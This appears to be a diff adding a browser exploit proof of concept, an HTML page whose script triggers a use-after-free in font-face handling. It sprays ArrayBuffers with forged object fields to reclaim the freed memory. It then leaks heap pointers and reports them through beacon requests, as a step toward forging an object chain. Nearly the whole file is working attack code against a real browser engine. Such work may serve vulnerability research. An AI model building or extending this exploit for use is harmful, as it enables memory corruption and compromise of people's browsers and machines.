@@ -1,0 +1,128 @@
+<!--
+  p588b: Route (d) — null table capture.
+  P588 confirmed Branch A: engine dereferences +0x58 as HashTable pointer.
+  Now set +0x58 = 0 (null) so addClient→expand→allocateTable(8) allocates
+  a fresh 80B table and writes T at +0x58.
+
+  We read T from our buffer → B = T - 0x60 → this is the block base.
+  Route (d) needs T to forge the chain.
+
+  Also captures:
+    - +0x68 (WeakPtrImpl*) — engine writes this at CSSFontFace.cpp:526
+    - +0x00 (refcount) — should go from 2 → 3+
+    - +0x82 (status byte) — should stay 3 (Success seed)
+    - keyCount check: if T is valid, engine wrote kc at T-0xC inside the
+      80B block (outside our buffer, not readable from JS)
+    - Lattice check: is T in the known 0x4000-stride family?
+
+  Expected beacons:
+    G           = start
+    F           = font freed inside getter
+    S<n>        = spray done
+    <t>H<i>,rc=<d>  = hit at lane i with refcount d
+    <t>T=<hex>      = +0x58 value (fresh table VA from engine)
+    <t>B=<hex>      = block base T-0x60
+    <t>W=<hex>      = +0x68 WeakPtrImpl value
+    <t>ST=<d>       = status byte at +0x82
+    <t>LATTICE=YES|NO = is T in known family?
+    <t>D0/D1/D2     = full qword dump
+    <t>MISS         = no hit at this scan
+    NHITS_RC=<n>,NHITS_T=<n> = totals at 5s
+    ALIVE / ALIVE2 / ALIVE3
+
+  CRASH_CLASS: HIGH
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p588b</title>
+<style id="v">@font-face{font-family:sa;src:local(Arial);unicode-range:U+0042}</style>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m,false);x.send();}catch(e){}}
+function rQ(v,o){var s='';for(var j=7;j>=0;j--)s+=('0'+v[o+j].toString(16)).slice(-2);return s;}
+function rD(v,o){return(v[o]|0)+((v[o+1]|0)<<8)+((v[o+2]|0)<<16)+((v[o+3]|0)*0x1000000);}
+function wD(v,o,x){v[o]=x&0xFF;v[o+1]=(x>>>8)&0xFF;v[o+2]=(x>>>16)&0xFF;v[o+3]=(x>>>24)&0xFF;}
+function wQ(v,o,hi,lo){wD(v,o,lo);wD(v,o+4,hi);}
+
+function main(){
+b('G');
+var pa=new FontFace('pa','local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(pa);void pa.loaded;
+var fired=0;
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+get:function(){if(fired)return;fired=1;
+document.getElementById('v').remove();
+try{document.fonts.delete(this);}catch(e){}
+document.body.offsetHeight;
+b('F');
+var lane=[];
+for(var i=0;i<2048;i++)lane.push(new Uint8Array(new ArrayBuffer(192)));
+for(var j=0;j<lane.length;j++){
+  wD(lane[j],0x00,2);
+  wQ(lane[j],0x58,0,0);
+  wD(lane[j],0x60,0);
+  wD(lane[j],0x64,0xFFFFFFFF);
+  wQ(lane[j],0x68,0,0);
+  lane[j][0x82]=3;
+}
+b('S'+lane.length);
+window._l=lane;
+return;},set:function(){}});
+
+document.fonts.load('1em pa, sa','AB').then(function(){},function(){});
+
+function scan(tag){
+  var lane=window._l;if(!lane)return;
+  var hi=window._hi;
+  if(hi===undefined){
+    for(var i=0;i<lane.length;i++){
+      var v=lane[i],rc=rD(v,0);
+      var t0=v[0x58]|v[0x59]|v[0x5A]|v[0x5B]|v[0x5C]|v[0x5D]|v[0x5E]|v[0x5F];
+      var w0=v[0x68]|v[0x69]|v[0x6A]|v[0x6B]|v[0x6C]|v[0x6D]|v[0x6E]|v[0x6F];
+      if(rc!==2||t0||w0){window._hi=i;hi=i;break;}
+    }
+  }
+  if(hi===undefined){b(tag+'MISS');return;}
+  var v=lane[hi];
+  var rc=rD(v,0);
+  b(tag+'H'+hi+',rc='+rc);
+  var t58=rQ(v,0x58);
+  if(t58!=='0000000000000000'){
+    b(tag+'T='+t58);
+    var tlo=rD(v,0x58),thi=rD(v,0x5C);
+    var blo=tlo-0x60,bhi=thi;
+    if(blo<0){blo+=0x100000000;bhi-=1;}
+    var bstr=('00000000'+bhi.toString(16)).slice(-8)+('00000000'+blo.toString(16)).slice(-8);
+    b(tag+'B='+bstr);
+    var inLattice=(thi>=0x1000&&thi<=0x10010&&(tlo&0x3FFF)===0x0010);
+    b(tag+'LATTICE='+(inLattice?'YES':'NO'));
+  } else {
+    b(tag+'T=NULL');
+  }
+  var w68=rQ(v,0x68);
+  b(tag+'W='+w68);
+  b(tag+'ST='+v[0x82]);
+  var d='';for(var q=0;q<8;q++)d+=rQ(v,q*8)+'.';b(tag+'D0:'+d);
+  d='';for(var q=8;q<16;q++)d+=rQ(v,q*8)+'.';b(tag+'D1:'+d);
+  d='';for(var q=16;q<24;q++)d+=rQ(v,q*8)+'.';b(tag+'D2:'+d);
+}
+
+setTimeout(function(){scan('A');},60);
+setTimeout(function(){scan('B');},400);
+setTimeout(function(){scan('C');},1000);
+setTimeout(function(){b('ALIVE');},500);
+setTimeout(function(){b('ALIVE2');},2000);
+setTimeout(function(){
+  b('ALIVE3');
+  var lane=window._l;if(!lane)return;
+  var nRC=0,nT=0,nW=0;
+  for(var i=0;i<lane.length;i++){
+    var rc=rD(lane[i],0);
+    var t0=lane[i][0x58]|lane[i][0x59]|lane[i][0x5A]|lane[i][0x5B]|lane[i][0x5C]|lane[i][0x5D]|lane[i][0x5E]|lane[i][0x5F];
+    var w0=lane[i][0x68]|lane[i][0x69]|lane[i][0x6A]|lane[i][0x6B]|lane[i][0x6C]|lane[i][0x6D]|lane[i][0x6E]|lane[i][0x6F];
+    if(rc!==2)nRC++;
+    if(t0)nT++;
+    if(w0)nW++;
+  }
+  b('NHITS_RC='+nRC+',NHITS_T='+nT+',NHITS_W='+nW);
+},5000);
+}
+setTimeout(main,0);
+</script></head><body>p588b</body></html>
